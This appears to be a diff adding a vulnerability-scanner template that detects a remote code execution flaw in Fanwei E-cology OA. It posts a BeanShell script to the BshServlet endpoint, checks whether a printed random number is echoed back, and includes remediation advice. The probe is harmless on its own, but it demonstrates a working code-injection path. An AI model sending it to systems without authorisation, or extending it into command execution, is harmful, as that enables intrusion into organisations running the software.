@@ -1,0 +1,35 @@
+id: ecology-javabeanshell-rce
+info:
+  name: Fanwei E-cology OA RCE
+  author:
+  - l0ne1y
+  description: |-
+    Fanwei E-cology RCE Vulnerability
+    Fanwei Collaborative Management Application Platform (e-cology) is a large enterprise collaborative management platform that integrates enterprise information portal, knowledge and document management, workflow management, human resource management, customer relationship management, project management, financial management, asset management, supply chain management, and data center capabilities. e-cology can provide a series of general-purpose and industry-specific solutions.
+
+    A code execution vulnerability exists in Fanwei E-cology. An attacker can exploit it to execute system commands.
+  severity: critical
+  remediation: |-
+    Official remediation:
+    1. It is recommended that users obtain the latest patch or the latest version of the program from the vendor:
+    https://www.weaver.com.cn/
+
+    Temporary remediation:
+    1. When invoking functions that can execute strings as code, strictly validate user-supplied parameters and try to avoid letting users control those parameters.
+    2. If business operations permit, remove this page or block external access to it.
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - '{{randomValue}}'
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/weaver/bsh.servlet.BshServlet'
+  method: POST
+  body: bsh.script=print%28{{randomValue}}%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+variables:
+  randomValue: '{{rand_int(40000, 44800)}}'
